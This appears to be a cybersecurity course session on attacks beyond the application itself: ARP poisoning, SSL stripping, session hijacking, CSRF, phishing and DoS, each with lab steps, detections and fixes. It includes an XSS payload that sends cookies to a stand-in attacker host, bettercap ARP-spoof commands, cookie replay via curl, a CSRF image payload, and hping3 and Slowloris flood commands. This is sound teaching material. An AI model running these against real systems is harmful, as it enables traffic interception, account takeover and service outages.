    The App Does Not Live Alone

    S09 · P03Why · the soft underbelly⏱ 5 min

    Why the Network and the Human Still Win

    Encryption and patches harden the app — but a poisoned ARP table, a reused cookie, and a convincing email bypass all of it.

    Where the hard shell is soft

    Organisations pour effort into hardening applications and servers. Attackers respond by moving to the parts that stay soft: the local network (which trusts ARP and DNS by default), the session layer (a stolen token needs no password), the human (who can be persuaded), and availability (which no amount of patching guarantees). These are not exotic — they are the reliable ways in when the front door is locked.

    Phishingthe leading initial-access vector in breach reports — the human is attacked more than any exploit
    ARP/DNStrust-by-default protocols with no authentication — a local attacker becomes the man in the middle
    A token= access without a password — steal the session and MFA on the login is already behind you
    Real-world anchor — the coffee-shop session steal

    Classic sidejacking: on open Wi-Fi, an attacker sniffs an unencrypted session cookie and loads it into their own browser — instantly logged in as the victim, no password, no MFA prompt (the login already happened). It is exactly why every serious site now forces HTTPS and marks cookies Secure; HttpOnly; SameSite — defences you will map at the end of this session.

    Harden everything, or the soft part wins

    Attackers pick the weakest layer, not the app. Network trust, session tokens, human judgement, and uptime are where effort lags — so they are where you test, and where the highest-leverage defences live.

    S09 · P04Method · read the wire⏱ 7 min

    Sniffing — Reading Traffic in Transit

    Before you can alter a conversation you must hear it. Learn passive vs active sniffing and why a switch forces you to poison ARP.

    Hearing the network

    Sniffing is capturing data as it crosses the network. On an old hub (or open Wi-Fi) every packet reaches everyone, so you just listen — passive. On a modern switch, traffic is delivered only to its destination port, so to see a victim's traffic you must actively redirect it to yourself — and that is where ARP poisoning comes in. Click each.

    ▶ Prove it — capture your own traffic and read a cleartext credential
    sudo tcpdump -i eth0 -A 'tcp port 80' | grep -iE 'pass|user|cookie'
# then log into any HTTP (not HTTPS) test page and watch the credential appear
# HTTPS shows only encrypted bytes — which is the whole point of TLS

    You should see: on cleartext HTTP the username, password, and cookie are right there in the capture. HTTPS turns them into noise — which is why the next attacks either need you in the middle before TLS, or try to strip it.

    Switch = you must redirect

    Passive listens; active redirects. A hub hands you everything; a switch forces you to poison ARP to become the man in the middle. That forged redirection is powerful — and detectable.

    S09 · P05Attack · become the middle⏱ 7 min

    ARP Poisoning — Becoming the Man in the Middle

    ARP has no authentication, so a forged reply reroutes a victim's traffic through you. Watch the poisoning take hold.

    The protocol that trusts anyone

    To send to an IP on the LAN, a host asks "who has this IP?" via ARP and caches whatever answer comes back — with no verification. So you simply keep telling the victim "the gateway's IP is at my MAC" and telling the gateway "the victim's IP is at my MAC." Both send their traffic to you; you forward it on, reading and altering as it passes. Watch it.

    ▶ Prove it — watch your own ARP table and spot a change
    arp -a                       # note the gateway's current MAC
# (in a lab MITM, after poisoning, the gateway IP shows the ATTACKER's MAC)
ip neigh | grep -i router    # same idea on Linux
# a gateway MAC that suddenly changes = ARP poisoning in progress

    You should see: the gateway's IP mapping to a new MAC — or one MAC owning several IPs — is the fingerprint of ARP poisoning. Detection is literally watching the ARP table for that change.

    No auth = forge at will

    ARP believes the last reply it hears. Forge the gateway mapping and you are the man in the middle. The defence is to watch for the mapping changing — static ARP, DAI, and port security on switches.

    S09 · P06Attack · strip the TLS⏱ 6 min

    SSL Strip — Turning HTTPS Back Into HTTP

    Being in the middle is not enough if the traffic is encrypted. Watch how a downgrade turns a secure session into a readable one — and why HSTS stops it.

    MITM meets encryption

    ARP poisoning puts you in the middle, but HTTPS makes the traffic unreadable. SSL stripping attacks the moment before encryption: many users type http:// or click an HTTP link, and the server redirects them to HTTPS. The man in the middle intercepts that first HTTP request and keeps talking HTTP to the victim while talking HTTPS to the server — so the victim's side is cleartext. Watch it, then meet the defence that kills it.

    ▶ Prove it — spot the missing padlock (the victim's only tell)
    # The victim's defence is noticing the URL is http:// not https:// and no padlock.
# As a tester, confirm a site's HSTS (which blocks the attack):
curl -sI https://example.com | grep -i strict-transport-security
# a 'Strict-Transport-Security' header = the browser will refuse HTTP = strip fails

    You should see: an HSTS header means the browser will never make that first cleartext request, so there is nothing to strip. Its presence or absence is the difference between "strippable" and "safe."

    Strip the redirect, not the crypto

    SSL strip attacks the HTTP-before-HTTPS moment. It never breaks TLS — it stops TLS from starting. HSTS (with preload) removes the cleartext step and defeats it.

    S09 · P07Method · steal the session⏱ 6 min

    Session Hijacking — Access Without a Password

    A session token is a bearer pass: whoever holds it is you. Learn why stealing one beats cracking a password, and how it differs from spoofing.

    The token is the identity

    After you log in, the app gives your browser a session token (a cookie) and trusts it on every later request — that is how you stay logged in without re-typing your password. Which means: whoever holds the token is you, password and MFA already satisfied. Session hijacking is stealing that token to take over an active session — distinct from spoofing, which starts a new session with stolen credentials.

    SpoofingHijacking
    Whatstart a NEW session with stolen credentialstake over an EXISTING active session
    Whenbefore authenticationafter authentication
    Needsthe victim's credentialsonly the session token
    Why session attacks succeed

    The enablers are all defensive gaps: no TLS (token sniffable), predictable or short IDs (guessable), no expiry (a stolen token works forever), no regeneration after login (fixation), and insecure storage (readable by XSS). Every one maps to a cookie-flag or config fix at the end of the session.

    ▶ Prove it — find your own session token and see it is the whole identity
    # In your browser dev-tools -> Application -> Cookies, find the session cookie
#   (PHPSESSID, JSESSIONID, session=...).
# Copy its value into a DIFFERENT browser's cookie for the same site and reload:
#   you are logged in as yourself in the second browser — no password asked.
# that is exactly what an attacker does with a STOLEN token.

    You should see: moving the cookie value to another browser logs you straight in — proving the token alone is your identity. An attacker who steals it (next pages) gets the same result without ever knowing your password.

    Hold the token, be the user

    A session token is a bearer credential. Steal it and you are authenticated as the victim — no password, no MFA prompt. That is why token confidentiality (TLS, HttpOnly) and lifecycle (expiry, regeneration) are the defences.

    S09 · P08Attack · get the token⏱ 7 min

    Application-Level Hijacking — Six Ways to the Token

    If the token is the prize, here are the ways to grab it — from sniffing to XSS to setting it yourself before the victim logs in.

    Many roads to one cookie

    Application-level hijacking targets the token directly. The methods differ in where they intercept it — on the wire, in the browser, or by planting one you already know. Click each; several tie back to attacks you have already done (XSS from S8, sniffing from this session).

    ▶ Prove it — steal a cookie with the S8 XSS payload — then note the HttpOnly fix
    # the stored-XSS finish from Session 8 IS session hijacking:
<script>new Image().src='http://ATTACKER/c?='+document.cookie</script>
# the attacker's log now has the victim's session cookie -> replay it (Lab B)
# DEFENCE test: is the cookie HttpOnly? dev-tools -> Application -> Cookies -> HttpOnly column
#   HttpOnly = true  ->  document.cookie can't read it  ->  this attack fails

    You should see: the same XSS you wrote last session steals the session cookie here — and the HttpOnly flag is the one-line fix that blocks it. Attack and defence, one payload.

    Every method has a flag that stops it

    Steal the token however you can; each way has a defence. Sniffing → Secure+TLS, XSS → HttpOnly, prediction → random IDs, fixation → regenerate on login, replay → expiry. Learn the pairs.

    S09 · P09Attack · the takeover flow⏱ 6 min

    The Hijack — Steal the Cookie, Ride the Session

    Watch a stolen token become a full account takeover: capture it, load it into your browser, and you are logged in — no password.

    From token to takeover

    However you obtained the cookie — sniffed, XSS'd, or replayed — the takeover step is the same and shockingly simple: put the token in your own browser and the app treats you as the victim. Watch the flow; it is the reason session confidentiality matters so much.

    ▶ Prove it — replay a session cookie between browsers (your own account)
    # 1. Log into a test app in Browser A. Copy the session cookie value.
# 2. In Browser B (logged out), open dev-tools and set the same cookie for that site.
# 3. Reload — Browser B is now logged in as you, no password.
# a SOC sees: one session ID, two source IPs at once = hijack.

    You should see: the cookie moved and the second browser inherited the session — a full takeover with nothing but the token. The detection is equally concrete: one session token appearing from two places at once.

    Confidentiality of the token is everything

    Whoever presents the token gets the session. Protect it in transit (TLS/Secure), from script (HttpOnly), and in time (expiry) — and watch for one token used from two places.

    S09 · P10Attack · forge the request⏱ 6 min

    CSRF — Make the Victim's Browser Attack for You

    You do not need the token if the browser will send it for you. Watch a forged request ride the victim's own session.

    Riding the session you cannot see

    Cross-Site Request Forgery is the clever cousin of hijacking: you never steal the token, you just get the victim's browser to use it. Because browsers attach a site's cookies to every request to that site — even ones triggered from another page — a hidden request on the attacker's page executes on the target site with the victim's full authority. Watch it.

    ▶ Prove it — build a CSRF proof-of-concept (against your own lab app)
    <!-- host this on any page; when a logged-in victim opens it, it fires -->
<img src="http://DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
<!-- DVWA's password-change happens with the victim's session, no token check -->

    You should see: loading the page silently changes the victim's password using their logged-in session — you never touched the cookie. The presence of an unguessable anti-CSRF token (and SameSite) is what makes this fail.

    Use the session, do not steal it

    CSRF abuses the browser's automatic cookie attachment. No token theft needed. The fix is a per-request anti-CSRF token plus SameSite cookies — both make the forged cross-site request fail.

    S09 · P11Attack · the packet level⏱ 6 min

    Network-Level Hijacking — Injecting Into a TCP Session

    Below the application, a session is a TCP stream held together by sequence numbers. Predict them and you can inject as either side.

    Hijacking the stream itself

    Application hijacking steals a cookie; network-level hijacking attacks the transport. A TCP connection is kept in order by sequence numbers; if an attacker (usually already MITM, from the ARP page) can see or predict them, they can inject packets that the server accepts as part of the victim's session — even desynchronising the real client out. Watch the idea.

    ▶ Prove it — see the sequence numbers that hold a session together
    sudo tcpdump -i eth0 -n 'tcp' -S | head
# the -S flag shows ABSOLUTE sequence numbers.
# a MITM attacker who can read these can forge a packet with the next valid SEQ.
# TLS/SSH don't hide the numbers — they make injected PLAINTEXT useless.

    You should see: the sequence numbers are visible in any capture — they are what a hijacker needs. Note that encryption doesn't hide them; it makes any injected payload meaningless, which is why encrypted protocols defeat this attack in practice.

    Predict the sequence, own the stream

    TCP trusts sequence numbers. A MITM who reads them can inject as either side. Randomised ISNs stop blind prediction, and encryption (TLS/SSH) makes any injection useless — which is why cleartext protocols are the real risk.

    S09 · P12Hands-on · everyone · attack⏱ 18 min

    Lab A — ARP Poison, Then Sniff Credentials

    Become the man in the middle on your lab network and capture a cleartext credential — then watch the ARP anomaly you created.

    The full MITM chain

    You will poison a victim's ARP cache with bettercap (or ettercap), route their traffic through you, and capture a cleartext login in Wireshark — then look at your attack from the defender's side.

    Isolated lab, your own hosts only

    ARP poisoning disrupts a real network and is illegal off your own lab. Two lab VMs (a victim and a gateway/target) on the host-only network, and an HTTP (not HTTPS) service to capture.

    1. Find the hosts and enable forwarding so the victim keeps working (stay transparent): 
      sudo bettercap -iface eth0
> net.probe on            # discover LAN hosts
> net.show                # list them: victim + gateway

      ✓ Verification

      • bettercap maps the LAN. You need the victim IP and the gateway IP — the two ends you will sit between.
    2. Poison the victim ↔ gateway and start sniffing: 
      > set arp.spoof.targets 192.168.56.10   # the victim
> arp.spoof on
> net.sniff on                          # capture traffic flowing through you

      ✓ Verification

      • Forged ARP replies now route the victim's traffic through you; net.sniff records it. You are the man in the middle.
    3. Capture a credential — have the victim log into the HTTP test service and watch it appear: 
      # in bettercap's sniff output, or in Wireshark:
http.request and (frame contains "pass" or frame contains "user")
# the cleartext username + password appear in the POST body

      ✓ Verification

      • The victim's HTTP login is in your capture in plaintext — the payoff of the MITM position. On HTTPS you would see only encrypted bytes (hence SSL strip / HSTS).
    4. Flip to defender — look at the ARP anomaly your attack created: 
      arp -a          # on the victim: the gateway IP now shows YOUR MAC
# arpwatch / XArp would alert: 'gateway 192.168.56.1 changed MAC'
# stop cleanly:  > arp.spoof off   (restores the real mappings)

      ✓ Verification

      • Your own attack is trivially visible from the ARP table — the gateway's MAC changed. That is the detection you will rule on in Lab E. Always stop the spoof cleanly.
    You were the middle — and it showed

    MITM gives you everything in cleartext — and leaves an ARP fingerprint. Poison, sniff, capture, then see the mapping change you caused. Attack and detection in one lab.

    S09 · P13Hands-on · everyone · attack⏱ 14 min

    Lab B — Steal and Replay a Session Cookie

    Take the token you can now sniff (or XSS) and ride the session — a full account takeover with no password, then the detection.

    Token to takeover, for real

    Combine this session's sniffing (or Session 8's XSS) with a cookie replay to take over an authenticated session on your lab app — then see the two-IP signature that gives it away.

    1. Obtain a token — sniff it from the Lab A MITM position, or steal it with the S8 XSS payload: 
      # from Lab A's capture, pull the Cookie header:
#   Cookie: PHPSESSID=abc123...
# or from an XSS'd victim, read it out of your harvesting log

      ✓ Verification

      • Either route gives you a valid session cookie value — the only thing you need.
    2. Replay it — present the stolen cookie as your own: 
      curl -b 'PHPSESSID=abc123...' http://APP/account
# or set it in your browser's dev-tools cookies and reload the app
# the app serves the VICTIM's authenticated account

      ✓ Verification

      • The server validates the token and serves the victim's session to you — logged in as them, no password, no MFA prompt.
    3. Confirm takeover and note what MFA does (and does not) stop: 
      # you can now act as the victim within their session.
# note: MFA on LOGIN did nothing — the login already happened.
# what limits you: short session expiry, or the app re-auth'ing for sensitive actions.

      ✓ Verification

      • The takeover proves MFA-on-login is bypassed by session theft. The controls that do help — expiry, re-auth, token binding — are the ones you will recommend.
    4. Flip to defender — identify the detection: 
      # the SOC sees ONE session token used from TWO source IPs at once,
# or a sudden user-agent / geolocation change on a live session.
# rule: alert on concurrent use of a session ID from distinct IPs.

      ✓ Verification

      • Concurrent use of one token from two IPs (or an impossible geo jump) is the hijack signature — your Lab E rule, and a real SOC detection.
    No password needed — and it is detectable

    A stolen token is a full login, but it leaves a trail. One session, two locations, is the tell. Defence: TLS + Secure/HttpOnly, short expiry, and concurrent-session detection.

    S09 · P15Why · the psychology⏱ 7 min

    Social Engineering — Hacking the Human

    The most reliable exploit targets no software at all. Learn the psychological levers that make good people click, and you learn the defence.

    No patch for judgement

    Social engineering attacks people, not systems — and it is the leading way real intrusions begin, because a human can be persuaded in ways a patched server cannot be exploited. It works by pulling psychological levers that normally serve us well: we defer to authority, we help under time pressure, we trust the familiar. Understanding why people comply is what lets you both run the attack and train people against it. Click each lever.

    ▶ Prove it — read a phishing email as a psychologist, not just a techie
    # For any suspicious message, name the lever(s) being pulled:
#   'URGENT: CEO needs gift cards now'      -> authority + urgency
#   'Your account is locked, verify here'   -> fear + trust (fake brand)
#   'Free security scan, just log in'        -> reciprocity + trust
# naming the lever is how you inoculate a user against it

    You should see: the technical tells (bad domain, odd link) matter, but the lever is why a smart person clicks. Training that names the psychology — not just "check the URL" — is what actually reduces click rates.

    Attack the person, defend the person

    Social engineering exploits normal, useful instincts. Authority, urgency, trust, fear, reciprocity — name the lever and you can both craft the attack and train the human to resist it. Awareness is the patch.

    S09 · P17Attack · harvest credentials⏱ 7 min

    The Phishing Flow — SET and the Credential Harvester

    Watch a phishing attack end to end: a pretext, a cloned login page, and a captured password — built with the Social-Engineer Toolkit.

    Automating the con

    The Social-Engineer Toolkit (SET) automates the technical half of phishing: it clones a real login page, hosts it, and captures whatever credentials a victim types. The human half — the pretext that gets them there — is yours to craft using the psychology from two pages ago. Watch the flow, then build one on your lab.

    ▶ Prove it — read the tells of a cloned login page
    # Teach users to check, in order:
#   1. the DOMAIN in the address bar   (paypa1.com != paypal.com)
#   2. the padlock + certificate name  (does it match?)
#   3. did I initiate this?            (unsolicited 'verify' = suspicious)
# and confirm a domain's age (young = suspicious) via whois:
whois suspicious-domain.com | grep -i 'creation'

    You should see: the cloned page can be perfect, but the domain cannot be — it is never the real one. Teaching users to read the address bar (and a young registration date) is the single highest-value phishing defence.

    Tech clones the page; you craft the pretext

    A phishing attack is a perfect page plus a believable story. SET makes the page trivial; the pretext (authority, urgency, trust) decides success. Defence: the domain always betrays it, and a reporting culture beats any filter.

    S09 · P19Attack · deny availability⏱ 6 min

    Denial of Service — Attacking Availability

    The third pillar of security is availability, and it is the one no patch guarantees. Learn the three ways to take a service down.

    When you cannot get in, keep everyone out

    Confidentiality and integrity get the attention, but availability is a security property too — and the easiest to attack. A DoS overwhelms a target from one source; a DDoS uses a botnet of many, which is both far more powerful and much harder to block. The three techniques differ in what they exhaust. Click each.

    ▶ Prove it — classify a DoS from its symptom
    # Match the symptom to the class:
#   'inbound traffic is 40 Gbps, link saturated'   -> volumetric (need upstream scrubbing)
#   'CPU fine, but the connection table is full'    -> protocol / SYN flood (SYN cookies)
#   'few requests/sec, yet all workers are busy'    -> app-layer / Slowloris (proxy + timeouts)

    You should see: the defence depends entirely on what is exhausted — bandwidth, connection state, or app workers. Volumetric must be stopped upstream; protocol and app-layer can be mitigated at the edge. Naming the class picks the fix.

    Availability is attackable — match the defence to the class

    DoS exhausts a resource: bandwidth, state, or app workers. Volumetric → upstream scrubbing/CDN; protocol → SYN cookies/rate-limit; app-layer → proxy/timeouts. DDoS (a botnet) makes all three worse and harder to filter by source.

    S09 · P20Attack · two ways down⏱ 6 min

    SYN Flood and Slowloris — Two Ways to Exhaust a Server

    Two classic low-bandwidth DoS attacks that beat a big server with a small pipe. Watch each exhaust a different resource.

    Small attacker, big target

    You do not need a botnet to understand DoS. A SYN flood (protocol) fills the connection table with half-open connections; Slowloris (app-layer) ties up every worker thread by dribbling out requests forever. Both beat a well-resourced server with very little bandwidth — watch how.

    ▶ Prove it — see half-open connections (the SYN-flood fingerprint)
    # on a server under (lab) SYN flood, count half-open connections:
ss -tan state syn-recv | wc -l      # a large number = SYN flood in progress
netstat -an | grep -c SYN_RECV        # same idea
# the fix, on Linux:  sysctl -w net.ipv4.tcp_syncookies=1

    You should see: a pile of SYN_RECV connections is the unmistakable SYN-flood signature — and tcp_syncookies is the one-line kernel mitigation that lets the server answer without holding the half-open state.

    Exhaust state, not bandwidth

    SYN flood fills the connection table; Slowloris fills the worker pool. Both are low-bandwidth and beat big servers. SYN cookies and a timeout-enforcing reverse proxy are the targeted fixes.

    S09 · P21Hands-on · everyone · contained⏱ 14 min

    Lab D — SYN Flood and Slowloris, Safely

    Take a lab service down two ways, watch the resource exhaust, then apply the mitigation and watch it recover.

    Attack, measure, mitigate

    You will run a SYN flood and a Slowloris against a lab web server, measure the exhaustion, then apply the fix and confirm recovery. The value is seeing the resource deplete and the mitigation restore it — not the takedown itself.

    Isolated lab service only

    DoS against any system you do not own is a serious crime, botnet or not. One lab web VM on the host-only network; keep the flood short and stop it cleanly.

    1. SYN flood the lab server and measure the half-open connections: 
      sudo hping3 -S --flood -p 80 192.168.56.20     # SYN flood (lab target)
# on the TARGET, watch the connection table fill:
ss -tan state syn-recv | wc -l                  # climbs fast

      ✓ Verification

      • The SYN_RECV count climbs and real requests start to fail — the connection table is the resource being exhausted.
    2. Mitigate the SYN flood and confirm recovery: 
      # on the target:
sudo sysctl -w net.ipv4.tcp_syncookies=1
# the server can now answer SYNs without holding half-open state -> service recovers

      ✓ Verification

      • SYN cookies let the server respond without reserving a table slot, so it serves real users again even under the flood — the targeted fix working.
    3. Slowloris — exhaust the worker pool with almost no bandwidth: 
      slowhttptest -c 500 -H -i 10 -r 200 -u http://192.168.56.20/    # slowloris-style
# the server stops answering new requests though bandwidth is tiny

      ✓ Verification

      • A few hundred slow connections tie up every worker and new users get nothing — app-layer exhaustion, not bandwidth.
    4. Mitigate Slowloris and note the class-specific defence: 
      # put a reverse proxy (nginx) in front with strict header/read timeouts,
# or enable mod_reqtimeout on Apache. Slow connections get dropped.
# lesson: each DoS CLASS needs its own fix — no single switch stops all three.

      ✓ Verification

      • A timeout-enforcing proxy drops the never-completing requests and the service recovers — a different fix for a different class, which is the whole point of classifying DoS.
    See the resource, apply the matching fix

    Each DoS class exhausts a different resource and needs a different fix. SYN cookies for the connection table, timeouts/proxy for the worker pool, upstream scrubbing for bandwidth. Classify first, then mitigate.

    S09 · P26Assess · 6 questions⏱ 10 min

    Knowledge Check

    Six questions across the session. Answer before you reveal — each explains the reasoning, not just the letter.

    Q1Why does sniffing on a modern switched network require ARP poisoning?

    • Switches encrypt all traffic
    • A switch delivers frames only to the destination port, so you must redirect the traffic to yourself
    • ARP poisoning decrypts HTTPS
    • Switches block promiscuous mode entirely

    Q2You steal a valid session cookie and load it into your browser, gaining the victim's account. Why doesn't their MFA stop you?

    • MFA only protects admin accounts
    • The cookie contains the MFA code
    • MFA was never enabled
    • Authentication already happened; you inherit the active session, so login-time MFA is behind you

    Q3Which cookie flag specifically stops an XSS payload from stealing the session cookie?

    • HttpOnly — the cookie can't be read by document.cookie
    • Secure — only sent over HTTPS
    • SameSite — not sent cross-site
    • Path — limits the cookie's scope

    Q4Why does a CSRF attack succeed without the attacker ever stealing the session cookie?

    • It cracks the cookie's encryption
    • It predicts the session ID
    • The browser auto-attaches the site's cookie to any request to that site, including the forged one
    • It uses XSS to read the cookie

    Q5A server stops responding under a few hundred slow connections at near-zero bandwidth. What is it, and the fix?

    • Volumetric flood; fix with upstream scrubbing
    • Slowloris (app-layer); fix with reverse-proxy connection timeouts
    • SYN flood; fix with SYN cookies
    • DNS amplification; fix with rate limiting

    Q6What is the most effective defence against credential phishing?

    • A better spam filter alone
    • Stronger passwords
    • Blocking all external email
    • MFA plus awareness training and a reporting culture — a phished password alone then fails
    Score yourself

    5–6 right: run a MITM lab or a phishing-analysis room next. 3–4: re-read the session-hijacking and DoS pages. <3: rewatch the ARP-poisoning and consolidated-SOC-flip diagrams.

    S09 · P27Wrap-up⏱ 4 min

    Session 9 — What You Keep

    Ten things that outlast the tools. The wire, the session, the human, and uptime are always attackable — and always defensible.

    The durable core

    You attacked the four things around the app: the network path, the session token, the human, and availability — then turned each into a detection and a fix. Tools change; the four surfaces and their defences do not.

    1. A switch forces active sniffing. Passive listens on a shared medium; a switch makes you poison ARP to become the MITM.
    2. ARP trusts the last reply. No authentication means a forged mapping reroutes traffic — and shows up as an ARP anomaly.
    3. SSL strip attacks the redirect, not the crypto. HSTS removes the cleartext first request and defeats it.
    4. A session token is a bearer credential. Hold it and you are the user — login-time MFA is already behind you.
    5. Every theft method has a flag that stops it. Sniff→Secure, XSS→HttpOnly, fixation→regenerate, replay→expiry.
    6. CSRF uses the session it can't see. The browser attaches the cookie automatically; anti-CSRF tokens + SameSite stop it.
    7. Social engineering exploits normal instincts. Authority, urgency, trust, fear, reciprocity — name the lever to defend it.
    8. The domain always betrays a phish. The page can be perfect; the URL cannot. Reading the address bar + MFA beats most phishing.
    9. DoS exhausts a resource. Bandwidth, connection state, or app workers — classify it to pick the fix; DDoS just adds sources.
    10. Everything leaves a signal. ARP anomaly, token-from-two-IPs, look-alike domain, traffic/state spike — the environment is monitorable.
